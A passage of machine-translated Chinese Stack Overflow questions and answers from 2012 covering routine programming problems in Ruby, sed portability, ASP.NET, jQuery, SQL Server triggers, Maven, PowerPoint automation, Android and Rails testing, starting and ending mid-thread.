## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:28:24.160

这解决了您的问题：

```
.fields {
  display: inline;
} 
```

# ruby-on-rails - Ruby 中的“警告：块参数的多个值（2 代表 1）”

> ID：10811454
> 
> 赞同：1
> 
> 时间：2012-05-30T07:03:00.843
> 
> 标签：ruby-on-rails, ruby

我有一个函数 users_by_role

它以以下格式返回数据，

```
[
  [#<Role id: 1, name: "Developer">,[#<User id:1, name: "Abc">,#<User id:2, name: "xyz">]]
  [#<Role id: 2, name: "Tester">,[#<User id:11, name: "Abcd">,#<User id:12, name: "wxyz">]]
] 
```

现在，我想为给定的角色选择用户

我在用，

```
project.users_by_role.select{|o| o.first.name == "Developer"} 
```

其中 project 是一个 Project 对象

一切都好，代码返回给我数据，但随之而来的是我收到以下警告

> 警告：块参数的多个值（2 比 1）

我也在寻找优化和更短的方法来做到这一点

完整的代码片段如下所示：

```
project.users_by_role.select{|o| o.first.name == "Developer" }.collect{|e| e.last.map{|f| [f.id,f.firstname + ' ' + f.lastname]}}.flatten(1).uniq 
```

通过上面的代码，我想获取给定角色的所有用户名。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:50:08.633

**警告：**它说您期望 1 个 argt，它通过了 2。那是因为它“扩展了 argts”以考虑 2 个元素数组。

```
project.users_by_role.select {|role, users| role.name == "Developer"} 
```

**为了更好的方式：**

如果角色在返回的#users_by_role 数据中是唯一的，则可以避免映射。

```
users = project.users_by_role.select {|role, users| role.name == "Developer"}.first.last
users_for_select = users.map {|user| [user.id, "#{user.firstname} #{user.lastname}"] } 
```

# linux - 如何修复 SED 就地替换 Mac OS 和 Ubuntu 问题

> ID：10811458
> 
> 赞同：0
> 
> 时间：2012-05-30T07:03:25.153
> 
> 标签：linux, macos, bash, ubuntu

我有一个 Bash 脚本，它替换了一个 PHP 常量，例如`define('xxxx',....);`用所需的一个。

经过：

```
sudo sed -E -i "" "s/^(define).*(${2})[\'|\"].*/${3}/g" "$file" 
```

问题是在 Ubuntu 上由于**i**之后的额外空间而失败。

```
-i "" 
```

如果我删除该空间，它将在 Ubuntu 上运行，但在 MacOS 上不起作用，例如给出错误。

```
sed: 1: "../config.php ...": invalid command code 
```

我有哪些选项可以在 *nix 上和平地使用这个命令？

提前感谢您的时间和知识。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:15:35.460

```
sudo perl -pi -e "s/^(define).*(${2})[\'|\"].*/${3}/g" "$file" 
```

不过，我怀疑你的意思是真的`['\"]`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:20:06.533

sed 的 -i 选项是 GNU 方言的一部分。这不是便携式的。

一种替代方法是使用临时中间文件：

```
sed ... ${file} > ${file}.tmp && mv ${file}.tmp ${file} 
```

另一种方法是使用 perl 而不是 sed，[正如 Triplee 所建议的那样](https://stackoverflow.com/a/10811625/45249)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-31T01:36:19.733

为了就地执行操作并禁止或避免创建备份文件，您可以根据操作系统设置一个数组条件。

```
[[ $(uname -s) == 'Darwin' ]] && ioption=(-i "") || ioption=(-i)
sed "${ioption[@]}" "s/^(define).*(${2})['\"].*/${3}/g" "$file" 
```

使用一个数组，以便引用的参数和多个选项/参数都可以工作。如果您想让其他东西有条件，您可以向数组中添加更多内容。

请注意，管道不是括号表达式中的替换字符 - 相反，它是按字面意思包含的。因此，除非您想潜在地匹配管道，否则您应该省略它。在外部双引号内，单引号不需要转义。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:04:26.100

在 OS X 上安装 GNU sed 并使用它。

# asp.net-mvc-2 - 运行单元测试项目时获取web项目中的文件路径

> ID：10811461
> 
> 赞同：1
> 
> 时间：2012-05-30T07:03:40.277
> 
> 标签：asp.net-mvc-2, file-io, c#-3.0

实际上，当从单元测试项目执行以下代码时，我得到了错误...其中 import 是以下代码中的 xml 文件。

```
XmlTextReader importReader= new XmlTextReader(System.Web.Hosting.HostingEnvironment.MapPath("~/Content/Importcontent/import")); 
```

上述代码存在于不同项目（类库）中的一种方法中，该方法用于单元测试项目中的测试方法

上面的路径存在于 web 项目中。和价值

```
System.Web.Hosting.HostingEnvironment.MapPath("~/Content/Importcontent/import") 
```

是空的..即无法获得文件的完整路径我猜bcos托管环境没有运行（网络项目）上面的代码在从网络项目运行时工作正常，即它返回确切的路径。而从测试项目运行时返回空值。

从测试项目运行时，请让我知道如何获取文件路径（Web 项目中存在文件的位置）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:08:10.563

您可以将文件名作为参数传递给方法，而不是让方法尝试检索它：

```
public void SomeMethod(string filename)
{
    using (XmlTextReader importReader = new XmlTextReader(filename))
    {
        ...
    }
} 
```

现在，当从您的 Web 层（控制器）调用此方法时，您可以像这样传递文件名：

```
public ActionResult Index()
{
    string filename = Server.MapPath("~/Content/Importcontent/import");
    SomeMethod(filename);
    ...
} 
```

并且当在测试项目中时，您可以传递一些您在单元测试中部署的其他文件。

# jquery - jQuery UI 效果“爆炸”在 IE8 中无法正常工作

> ID：10811463
> 
> 赞同：2
> 
> 时间：2012-05-30T07:03:42.570
> 
> 标签：jquery, jquery-ui

我正在使用 jquery-1.7.1.min.js 和 jquery-ui-1.8.17.custom.min.js 我的代码片段是

```
$(closeButton).click(function(){
    $( alertBox).hide("explode"); 
    $(alertWrapper).fadeOut(500);
    $(alertBox).remove();
    $(alertWrapper).remove();
}); 
```

在 IE8 中出现一些奇怪的行为，但在 IE7 和所有其他浏览器中运行良好

“爆炸”效果越来越慢，当 DIV 元素分成 6 部分后，它在 IE 8 中没有消失，我已经检查了它三次......

您的任何帮助将不胜感激...

提前致谢。

[jsFiddle](http://jsfiddle.net/dilse_arnab/R9dsq)

# c++ - 如何从内存签名文件数据中获取签名者的公司名称？

> ID：10811465
> 
> 赞同：3
> 
> 时间：2012-05-30T07:03:56.293
> 
> 标签：c++, windows, winapi

我使用`CryptQueryObject`函数来获取`HCRYPTMSG* phMsg`.

`dwObjectType`is和is`CERT_QUERY_OBJECT_BLOB`是`pvObject`一个`CERT_BLOB`（设置内存数据点和大小）指针。它可以在windows7下工作，但在Vista下有问题。在 Vista 中，它会返回错误代码`0x80092009`（“找不到请求的对象”）。

有什么建议么？谢谢大家。

# javascript - 如何在 PHP 代码中使用 JavaScript 代码

> ID：10811473
> 
> 赞同：0
> 
> 时间：2012-05-30T07:04:34.623
> 
> 标签：javascript

我想知道用户在我的应用程序中的当前位置。为此我必须使用

我的 PHP 代码中的地理位置代码。但我不知道如何在 PHP 代码中使用 JavaScript 代码。

地理定位的 JavaScript 代码如下。

```
 function displayLocation(loc){
      var lat = loc.coords.latitude;
      var lon = loc.coords.longitude;
      }
      function getLocation(){
      navigator.geolocation.getCurrentPosition(displayLocation);
      }
    $(document).ready(function(){
    getLocation();
    }); 
```

我想将这些纬度和经度值分配给我的 php 变量纬度和经度。

为此，我必须知道如何在 php 中使用 JavaScript 代码以及如何将 JavaScript 值分配给 php 变量。

如果有任何建议可以完成此任务，请告诉我。

```
 Thanks....... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:09:10.563

您不能将 javascript 值分配给 PHP 值，因为 javascript 在客户端运行，而 PHP 在服务器端运行。

您需要使用简单的 POST/GET 操作或使用 ajax 将纬度和经度值发送回服务器。

**获取用户位置：**

```
<script type="text/javascript">
    function displayLocation(loc){
      var lat = loc.coords.latitude;
      var lon = loc.coords.longitude;
      $("#lat").val(lat);
      $("#lon").val(lon);
    }
    function getLocation(){
      navigator.geolocation.getCurrentPosition(displayLocation);
    }
    $(document).ready(function(){
      getLocation();
    });
</script> 
```

**将位置值放入表单中，然后将其提交到服务器端：**

```
<form action="coordinates.php" method="post" id="cform">
  Latitude: <input type="text" name="lat" id="lat" value=""><br>
  Longitude: <input type="text" name="lon" id="lon" value=""><br>
  <input type="submit" name="submit" value="Send data">
</form> 
```

**从表单处理用户在 PHP 中的位置：**

```
<?php
  $lat = $_POST["lat"];
  $lon = $_POST["lon"];
  echo "Your location is: " . $lat . ", " . $lon;
?> 
```

[JSFiddle 演示](http://jsfiddle.net/xuM86/1/)

**上面代码的 Ajax 示例：**

```
$.post("coordinates.php", $("#cform").serialize(), function(result){
    // code executed here when we get response from the server
    alert(result);
}); 
```

# maven - 模块需要安装其他模块

> ID：10811478
> 
> 赞同：1
> 
> 时间：2012-05-30T07:04:46.640
> 
> 标签：maven, maven-release-plugin

我有一个包含两个模块的项目。该模块应该`base`被`pom`某种类型的项目用作父模块。该模块`archetype`是一个原型，它创建一个使用`base`项目作为父项目的项目。我想用`maven-release-plugin`来发布这些项目。问题是`archetype`有一个需要`base`安装到本地存储库`test`的集成测试（-目标作为集成测试的一部分在新创建的项目上运行）。当我准备发布时，`maven-release-plugin`唯一会为每个模块运行`test`-goal。这意味着集成测试将始终失败，因为`base`找不到，因为它尚未安装。有什么解决方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T15:49:39.180

我遇到了类似的情况，原型生成的项目使用在同一反应器构建中构建的 Maven 插件。我使用[`invoker:install`](http://maven.apache.org/plugins/maven-invoker-plugin/install-mojo.html)将我的插件安装到仅用于原型的集成测试的本地存储库中（`localRepositoryPath`对`invoker:install`和使用相同的`archetype:integration-test`）；`invoker:install`实际上安装了反应堆中所有已经构建的工件，所以我什至不需要指定任何东西。我没有遇到任何排序问题（我的插件是在我的原型之前构建的），但是我想我可以从原型中添加对插件的依赖项（in `scope=test`）。

```
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-invoker-plugin</artifactId>
  <version>1.8</version>
  <executions>
    <execution>
      <goals>
        <goal>install</goal>
      </goals>
    </execution>
    <configuration>
      <localRepositoryPath>${project.build.directory}/it-repo</localRepositoryPath>
    </configuration>
  </executions>
</plugin>
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-archetype-plugin</artifactId>
  <version>2.2</version>
  <configuration>
    <localRepositoryPath>${project.build.directory}/it-repo</localRepositoryPath>
  </configuration>
</plugin> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:26:55.950

好吧，您可以（并且可能应该）定义`pom`聚合所有这些内部相关模块的多模块项目，因此它们可以在公共反应器中构建，即使它们没有安装到本地存储库，它们也可以相互看到。然后，你总是发布这个`pom`项目（聚合器）和它的所有模块（包括`base`和`archetype`）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T08:07:50.137

解决方案是在原型[`install:file-install`](http://maven.apache.org/plugins/maven-install-plugin/install-file-mojo.html)的`pre-integration-test`-phase 中运行，并将其配置为安装所需的父级。

# python - 使用 Python 的 win32com 控制 PowerPoint。如何以编程方式访问“另存为”选项

> ID：10811480
> 
> 赞同：1
> 
> 时间：2012-05-30T07:04:54.577
> 
> 标签：python, vba, client, powerpoint, win32com

我正在尝试通过 python 打开 powerpoint，然后将幻灯片演示文稿保存为 pdf 讲义（三到一页）。经过一番谷歌搜索，我偶然发现了[这个](https://stackoverflow.com/questions/2170830/vba-save-presentation-as-pdf-in-handout-2x2-format-office-2007)。一个非常相似的问题。但是，我似乎无法让它运行。我想我可能错误地将VB“翻译”成Python。

[在这里查看](http://msdn.microsoft.com/en-us/library/bb231096.aspx)MSDN 文档，我尝试填写两个必需的参数作为起点。虽然它似乎接受`path`，但它会引发`FixedFormatType`.

我的代码如下。

```
import win32com.client, sys, os

app = win32com.client.Dispatch("PowerPoint.Application")
app.Visible = True

names = []
for i in os.listdir(os.getcwd()):
    if i[-1] == 't':
        tmp = os.getcwd() + '\\' + i
        names.append(tmp)
        tmp = ''

presentation = app.Presentations.Open(names[0])
presentation.ExportAsFixedFormat(os.getcwd() + '\\test.pdf', 'PpFixedFormatType') 
```

我已经尝试了许多不同的`ppFixdFormatType`论点。`ppFixedFormatTypePDF`, `win32com.ppFixedFormatTypePDF`, `win32com.client.constants.ppFixedFormatTypePDF`, 等等..但都会引发一种或另一种类型的错误。大多数与此类似：`ValueError: invalid literal for int() with base 10: 'PpFixedFormatType'`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-06T17:10:39.890

您可能在 PowerPoint 的 API 中遇到过这个错误：[使用 PowerPoint 2007 的导出功能时类型不匹配](http://sourceforge.net/p/pywin32/bugs/339/)。解决方案是将 PrintRange 参数指定给 ExportAsFixedFormat() 调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-20T20:51:00.347

我知道问题是关于通过 VBA 操作 PowerPoint，但是您也可以使用免费和开源的[pdftools](https://github.com/raffaem/pdftools)将 PDF 幻灯片保存为讲义（就像 PowerPoint 一样） 。

保存 3x3 讲义的命令是：

```
pdftools --input-file slides.pdf --output slides_W.pdf --white-page --fitpaper --overwrite
pdftools --input-file slides_W.pdf --nup 3 3 --height 0.32 --delta 0mm 0mm --landscape --out-suffix _HANDOUT --frame --overwrite --paginate --paper a4paper -t $filename 0.4 0.01 
```

`--nup`您可以通过操作传递给选项的参数来获得不同的讲义布局

# c# - 获取客户端 IP 和计算机的用户名

> ID：10811482
> 
> 赞同：0
> 
> 时间：2012-05-30T07:04:58.350
> 
> 标签：c#, wpf

```
 user = System.Security.Principal.WindowsIdentity.GetCurrent(); 
```

我正在使用它来获取试图删除我留在目录中的文件的用户的信息，但是我的计算机和他的都是客户端，所以用户总是返回我的计算机的名称。你能告诉我如何解决这个问题吗？

[更多说明：我正在制作一个应用程序来监视我的文件夹的特定文件，我的计算机是客户端计算机，他也是客户端，我尝试监视文件服务器的公共场所，例如 \192.168.1.15\Public\myfolder，我会希望从其他可能试图删除我在该文件夹中的文件之一的客户那里获得任何访问权限。] 感谢您提供的任何想法和解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:44:19.423

这对你有帮助吗？似乎与您的问题非常相似。它使用 FileSystemWatcher 监视文件夹并从事件日志中读取有关用户的信息。

[获取访问文件的用户名](https://stackoverflow.com/questions/7861512/get-username-of-an-accesed-file)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:23:35.330

查看`Dns.GetHostName()`from `System.Net`namespace 获取计算机的主机名，或`Environment.MachineName`用于机器名。

要获取当前用户名，请使用`Environment.UserName`.

# google-places-api - 为什么禁用 Google API 密钥？

> ID：10811483
> 
> 赞同：0
> 
> 时间：2012-05-30T07:04:59.040
> 
> 标签：google-places-api

我编写了示例应用程序以获取用户附近的特定地点详细信息。我得到了 API KEY，但我的密钥有一个问题。当我在我的代码中插入密钥时。我得到了错误。该错误是提供的密钥不是有效的 Google API 密钥，或者未授权此站点上的 Google 地图 java 脚本 API v3。

我的代码运行良好，没有任何密钥。任何人告诉这个关键的解决方案。

提前谢谢，swathi。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:30:36.863

[Google Maps JavaScript API V3 Places Library](https://developers.google.com/maps/documentation/javascript/places)不需要 API 密钥来实现，但是使用 API 密钥可以让您监控应用程序的 Maps API 使用情况，并确保 Google 可以在必要时就您的应用程序与您联系。

如果您希望使用 API 密钥，您可以按照[此处](https://developers.google.com/maps/documentation/javascript/tutorial#api_key)的说明获取。

然后在您的代码中包含 Maps API JavaScript 时，插入您的 API 密钥。

例如

```
<script type="text/javascript"
  src="http://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&sensor=SET_TO_TRUE_OR_FALSE">
</script> 
```

# swing - java - 如何将菜单项置于java中的所有其他组件之上？

> ID：10811486
> 
> 赞同：1
> 
> 时间：2012-05-30T07:05:07.987
> 
> 标签：swing

我在 java 中创建了动态菜单项，其中子菜单是从单击菜单项的那个类别的数据库创建的。在相同的表单中，我有其他组件列表来查看结果。现在我的问题是创建的菜单项隐藏在这个 jlist 后面。我想知道如何在其他组件上方显示这些菜单项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:14:54.053

因为，我真的不知道，你到底在哪里添加`JMenuBar`你的`JFrame`，意思是说使用哪个代码。当您将菜单和所有内容添加到您的`JMenuBar`并将其添加到您的`JFrame`简单使用时`frameObject.revalidate() for JDK 1.7 or above` `For JDK 1.6 or below use frameObject.getContentPane().revalidate()`和`frame.repaint()`. 这是一个示例程序供您理解：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class DrawingExample
{
    private int x;
    private int y;
    private String text;
    private DrawingBase canvas;

    private void displayGUI()
    {
        final JMenuBar menuBar = new JMenuBar();
        JMenu menu = new JMenu("File");
        JMenuItem menuItem = new JMenuItem("Open");

        menu.add(menuItem);
        menuBar.add(menu);

        final JFrame frame = new JFrame("Drawing Example");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        canvas = new DrawingBase();
        canvas.addMouseListener(new MouseAdapter()
        {
            public void mouseClicked(MouseEvent me)
            {
                text = "X : " + me.getX() + " Y : " + me.getY();
                x = me.getX();
                y = me.getY();
                canvas.setValues(text, x, y);
                frame.setJMenuBar(menuBar);
                frame.revalidate();
                frame.repaint();
            }
        }); 

        frame.setContentPane(canvas);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);     
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new DrawingExample().displayGUI();
            }
        });
    }
}

class DrawingBase extends JPanel
{
    private String clickedAt = "";
    private int x = 0;
    private int y = 0;

    public void setValues(String text, int x, int y)
    {
        clickedAt = text;
        this.x = x;
        this.y = y;
        repaint();
    }

    public Dimension getPreferredSize()
    {
        return (new Dimension(500, 400));
    }

    public void paintComponent(Graphics g)
    {
        super.paintComponent(g);
        g.drawString(clickedAt, x, y);
    }
} 
```

# sql - SQL Server 触发器 - SET 变量 = column.value

> ID：10811491
> 
> 赞同：1
> 
> 时间：2012-05-30T07:05:18.253
> 
> 标签：sql, sql-server-2008

我正在尝试创建一个在 table`component`和 logging上操作的触发器`UPDATE`，`DELETE`以及`INSERT`对 table 的操作`component_history`

```
CREATE TRIGGER component_hist
ON component
AFTER INSERT, UPDATE, DELETE
AS

DECLARE
   @tr_action varchar(8),
   @tr_id_compoment int,
   @tr_name varchar(max),
   @tr_value int

IF COLUMNS_UPDATED() <> 0 -- delete or update?
BEGIN     
  SET @tr_action = 'UPDATE'
ELSE -- delete     
BEGIN
  SET @tr_action = 'DELETE'
END

INSERT INTO component_history VALUES (@tr_id_component, @tr_name, @tr_value, @tr_action); 
```

如何将`id, name, value`表中的列（）中的信息发送`component`到`component_history`？

我试过了：

```
SET 
@tr_id_component = component.id,
@tr_name = component.name,
@tr_value = component.value 
```

但它报告：

> 消息 4104，级别 16，状态 1，过程 component_hist，第 22 行
> 无法绑定多部分标识符“component.id”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:21:18.153

像这样的东西就足够了：

```
CREATE TRIGGER component_hist
ON component
AFTER INSERT, UPDATE, DELETE
AS

INSERT INTO component_history /* I'd prefer to see a column list here */
select id,name,value,CASE WHEN EXISTS(select * from deleted) THEN 'UPDATE' ELSE 'INSERT' END
from inserted
UNION ALL
select id,name,value,'DELETE'
from deleted
where not exists(select * from inserted) 
```

一个*小*的优化（如果你有很多**大**的更新）将把`EXISTS (select * from deleted)`评估移出`SELECT`（因为它目前每行评估一次）。

另请注意，在这种`UPDATE`情况下，我们只是存储新值，而不是旧值。

* * *

[`inserted`和`deleted`伪表](http://msdn.microsoft.com/en-us/library/ms191300.aspx)是特殊的- 它们包含受导致触发器触发的语句影响的行。该`inserted`表包含任何新行，并且该`deleted`表包含任何旧行。这导致在 , 期间为空的逻辑`insert`（`deleted`没有旧行受插入影响）。在 a 期间`delete`，`inserted`将是空的（没有创建新行）。在 期间`update`，两个表都被填充。

这就是为什么顶部的部分同时`select`适用于`insert`和`update`操作，因为我们使用的是`inserted`表。但是我们检查 中是否有行`deleted`，以区分这两个操作。在底部`select`（在 下方`union all`），我们查询`deleted`表 - 但如果这实际上是一个操作，我们使用该`where`子句来防止返回任何行。`update`

# alignment - 在“超越比较”的 3 路合并中控制手动对齐

> ID：10811493
> 
> 赞同：11
> 
> 时间：2012-05-30T07:05:20.513
> 
> 标签：alignment, beyondcompare, three-way-merge

在“Beyond Compare”中进行 3 路合并时，由于代码相似性，我们可以得到以下错位（X 是已删除的代码段，仅显示两个文件）：

```
/*                         XXXXXXXXXXXXXXXXX 
somefunc()                 somefunc()   <---2
{                          {
body                       body
...                        ... 
}                          }
*/                         XXXXXXXXXXXXXXXXX 
somefunc()   <---1         XXXXXXXXXXXXXXXXX
{                          XXXXXXXXXXXXXXXXX
modified body              XXXXXXXXXXXXXXXXX  
...                        XXXXXXXXXXXXXXXXX
}                          XXXXXXXXXXXXXXXXX
...next segment            ...next segment 
```

所需的对齐方式如下：

```
/*                         XXXXXXXXXXXXXXXXX 
somefunc()                 XXXXXXXXXXXXXXXXX  
{                          XXXXXXXXXXXXXXXXX
body                       XXXXXXXXXXXXXXXXX
...                        XXXXXXXXXXXXXXXXX
}                          XXXXXXXXXXXXXXXXX
*/                         XXXXXXXXXXXXXXXXX 
somefunc()                 somefunc()  
{                          {           
modified body              body
...                        ...    
}                          }           
...next segment            ...next segment 
```

所以我在位置 2 和位置 1 之间进行了手动对齐，而我实际得到的是：

```
/*                         XXXXXXXXXXXXXXXXX 
somefunc()                 XXXXXXXXXXXXXXXXX  
{                          XXXXXXXXXXXXXXXXX
body                       XXXXXXXXXXXXXXXXX
...                        XXXXXXXXXXXXXXXXX
}                          XXXXXXXXXXXXXXXXX
*/                         XXXXXXXXXXXXXXXXX 
somefunc()                 somefunc()  
XXXXXXXXXXXXXXXXX          {           
XXXXXXXXXXXXXXXXX          body
XXXXXXXXXXXXXXXXX          ...    
XXXXXXXXXXXXXXXXX          }           
{                          XXXXXXXXXXXXXXXXX                        
modified body              XXXXXXXXXXXXXXXXX
...                        XXXXXXXXXXXXXXXXX
}                          XXXXXXXXXXXXXXXXX
...next segment            ...next segment 
```

因此它设法在一行上进行对齐，但随后将其余代码向下移动。

我们如何使用手动对齐来获得预期的结果？更改设置以修改对齐参数也不会达到预期的结果。（另外注意：body和modified body很相似，所以不能错过搭配）

他们在他们的论坛上发表了一篇文章，[其中](http://www.scootersoftware.com/vbulletin/showthread.php?t=7924)提到了逐行对齐，但对于较长的部分来说，这将是非常乏味的。

**编辑：** 如果在当前版本中无法进行上述对齐，是否可以禁用输入和输出编辑器窗格的自动同步滚动，以便用户可以同时查看未对齐的代码部分。这些部分不会被程序对齐，但从用户的角度来看会被认为是对齐的。

# web-services - 与 web 服务的连接失败

> ID：10811494
> 
> 赞同：0
> 
> 时间：2012-05-30T07:05:22.307
> 
> 标签：web-services, soap

我为 2.3 版开发了应用程序，它使用 Web 服务来验证设备用户；当我部署在三星 GT-P3100（版本 4.0.3 Icecream Sandwitch）时，我遇到了相同的应用程序连接失败；虽然我可以使用浏览器与 Web 服务通信的设备.. .请建议，我是否需要为版本 4.0.3 重新创建项目，或者选项卡是否需要 mainfest 文件中的一些特殊权限？...可能是什么原因

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:09:02.590

使用此代码获取 html 内容：

```
public static String getHTML ( String url) throws IOException { 
            if (url == null || url.length() == 0) { 
                    throw new IllegalArgumentException("url cannot be null or empty"); 
            } 
            final HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection(); 
            final BufferedReader buf = new BufferedReader(new InputStreamReader(conn.getInputStream())); 
            final StringBuilder page = new StringBuilder(); 
            final String lineEnd = System.getProperty("line.separator"); 
            String line; 
            try { 
                    while (true) { 
                            line = buf.readLine(); 
                            if (line == null) { 
                                    break; 
                            } 
                            page.append(line).append(lineEnd); 
                    } 
            } finally { 
                    buf.close(); 
            } 

            try {
                    return page.toString().substring(0, page.toString().length() -1);
            } catch (Exception e) {
                    return "";
            }

    } 
```

您需要在 AndroidManifest.xml 中添加权限

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

也许在 android 4 和更高版本上，您需要在新线程中执行此功能，为此使用代码：

```
startInNewThread();

//call the fonction getHTML() in a new thread
private void startInNewThread() {

            new Thread(new Runnable() {
                    @Override
                    public void run() {
                          getHTML ("URL");

                    }
            }).start();
    } 
```

如果您需要使用“getHtml()”的结果更新 UI，则必须创建一个处理程序

# zend-framework - 找不到类“PDO”

> ID：10811495
> 
> 赞同：-1
> 
> 时间：2012-05-30T07:05:25.610
> 
> 标签：zend-framework, pdo

上传在 Zend Framework 中创建的网站时出现此错误

致命错误：在第 32 行的 /library/Doctrine/DBAL/Driver/PDOConnection.php 中找不到类“PDO”

虽然我在 php.ini 中有这段代码

```
extension=pdo.so 
extension=pdo_sqlite.so 
extension=sqlite.so 
extension=pdo_mysql.so 
```

我能做些什么来解决这个问题？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T00:02:43.830

未找到与 PHP 版本相关的“PDO”类

你应该使用 PHP 5.3.x 版本，它会工作

# liferay - NullPointerException 使用 liferay-ui taglib

> ID：10811498
> 
> 赞同：3
> 
> 时间：2012-05-30T07:05:41.823
> 
> 标签：liferay, taglib, liferay-6

我正在尝试在我的（Liferay 6.1）portlet 中使用 liferay-ui:icon-help 标签，但添加

`<liferay-ui:icon-help message="help me"/>`

我的edit.jsp给了我

`ERROR [render_portlet_jsp:154] java.lang.NullPointerException at com.liferay.taglib.ui.IconHelpTag.processEndTag(IconHelpTag.java:57)`

我确定我正确导入了 taglib，因为 liferay-ui:calendar 等其他标签工作得很好。

我忘了什么吗？

编辑：IconHelpTag.java:57 表明主题有问题，但我没有玩这个，服务器几乎是开箱即用的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:31:07.767

看起来 liferay-ui:icon-help 标记调用主题相关对象，将以下行添加到您的 jsp：

```
<%@ taglib uri="http://liferay.com/tld/theme" prefix="liferay-theme"%>
<liferay-theme:defineObjects /> 
```

# ruby-on-rails - RSpec 测试失败

> ID：10811499
> 
> 赞同：6
> 
> 时间：2012-05-30T07:05:43.867
> 
> 标签：ruby-on-rails, rspec, railstutorial.org

确实，这是一个配置问题。spec/spec_helper.rd 指向“测试”环境。我将其更改为“开发”以使其引用 config/environments/development.rb

最好的问候
弗雷德

我是 RoR 的新手，并且遵循 Michael Hartl 的 RoR 3.2 教程。

在执行第一个测试时（第 3.2.1 章），RSpec 从这个错误开始返回一百个错误（并且看起来或多或少都相同）：

```
/home/fred/.rvm/gems/ruby-1.9.3-p0@ODQ/gems/activerecord-3.2.1/lib/active_record/connection_adapters/abstract/connection_specification.rb:45:in
`resolve_hash_connection': database configuration does not specify
adapter (ActiveRecord::AdapterNotSpecified) 
```

我的 DEV 数据库是 PostgreSQL，看起来运行良好（迁移运行良好）。

有人可以帮助我了解问题所在并解决吗？

谢谢。

**宝石文件：**

```
source 'https://rubygems.org'

gem 'rails', '3.2.1'

# Bundle edge Rails instead:
# gem 'rails', :git => 'git://github.com/rails/rails.git'

gem 'postgres-pr'
gem 'pg'

# gem for test scripts
group :development, :test do 
gem 'rspec-rails'
end

group :test do
  gem 'capybara', '1.1.2'
end

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails',   '~> 3.2.3'
  gem 'coffee-rails', '~> 3.2.1'
  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails' 
```

**数据库.yml：**

```
# PostgreSQL 8.4
development:
  adapter: postgresql
  encoding: unicode
  database: ODQ_APP
  pool: 5 
```

**环境：**

```
Ruby version    1.9.3 (i686-linux)
RubyGems version    1.8.15
Rack version    1.4
Rails version   3.2.1
JavaScript Runtime  Node.js (V8)
Active Record version   3.2.1
Action Pack version 3.2.1
Active Resource version 3.2.1
Action Mailer version   3.2.1
Active Support version  3.2.1
Middleware  

ActionDispatch::Static
Rack::Lock
#<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0xa848460>
Rack::Runtime
Rack::MethodOverride
ActionDispatch::RequestId
Rails::Rack::Logger
ActionDispatch::ShowExceptions
ActionDispatch::DebugExceptions
ActionDispatch::RemoteIp
ActionDispatch::Reloader
ActionDispatch::Callbacks
ActiveRecord::ConnectionAdapters::ConnectionManagement
ActiveRecord::QueryCache
ActionDispatch::Cookies
ActionDispatch::Session::CookieStore
ActionDispatch::Flash
ActionDispatch::ParamsParser
ActionDispatch::Head
Rack::ConditionalGet
Rack::ETag
ActionDispatch::BestStandardsSupport

Application root    /home/fred/rails_projects/ODQ
Environment development
Database adapter    postgresql
Database schema version 20120503135705 
```

**弗雷德**

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-30T11:38:12.350

你需要解决这个问题

```
# PostgreSQL 8.4
development:
  adapter: postgresql
  encoding: unicode
  database: ODQ_APP
  pool: 5 
```

并像这样添加测试部分

```
# PostgreSQL 8.4
test:
  adapter: postgresql
  encoding: unicode
  database: ODQ_APP_test
  pool: 5 
```

还记得创建测试数据库 :) Rspec 在“测试”环境中运行，因此他将在 database.yml 中查找测试密钥而不是开发 :)

# java - 杀死 CPU 的 Jpanel 实现

> ID：10811502
> 
> 赞同：1
> 
> 时间：2012-05-30T07:05:54.773
> 
> 标签：java, swing, jpanel, cpu-usage

我在使用一个实现 JPanel 的类时遇到了问题，它似乎会杀死我的 CPU，即使应用程序处于空闲状态并且没有后台线程或类似的东西也是如此。

这个类看起来像这样：

```
public class GradientPanel extends JPanel {

/**
 * Serial ID
 */
private static final long serialVersionUID = 1L;

/**
 * Starting color for the gradient
 */
private Color startColor;

/**
 * Ending color for the gradient
 */
private Color endColor;

/**
 * Border Color
 */
private Color borderColor;

@Override
/**
 * This is the method that actually paints the Panel 
 * 
 * @param   g   The graphics object used to do the rendering
 * 
 */
protected void paintComponent( Graphics g ) {

